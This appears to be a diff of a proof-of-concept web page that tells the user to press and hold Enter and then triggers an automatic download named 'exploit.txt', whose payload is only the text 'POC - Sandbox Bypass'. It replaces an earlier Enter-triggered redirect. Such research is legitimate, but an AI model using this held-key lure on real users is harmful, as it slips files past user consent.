@@ -15,13 +15,14 @@
     <button id="targetBtn">Click this button, then PRESS and HOLD "Enter"</button>
     <script>
         document.getElementById('targetBtn').focus();
-        window.addEventListener('keydown', (e) => {
-            // if (e.key === 'Enter') {
-            //     document.body.innerHTML = "<h3>Navigasi... Hold Enter!</h3>";
-            //     window.location.href = 'https://kaleidoscopic-druid-cece23.netlify.app/site-b.html';
-            // }
-            if (e.key === 'Enter') {
-                window.location.href = 'https://kaleidoscopic-druid-cece23.netlify.app/site-b.html';
+        document.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") {
+                const a = document.createElement("a");
+                a.href = "data:application/octet-stream;base64,UE9DIC0gU2FuZGJveCBCeXBhc3M=";
+                a.download = "exploit.txt";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
             }
         });
     </script>
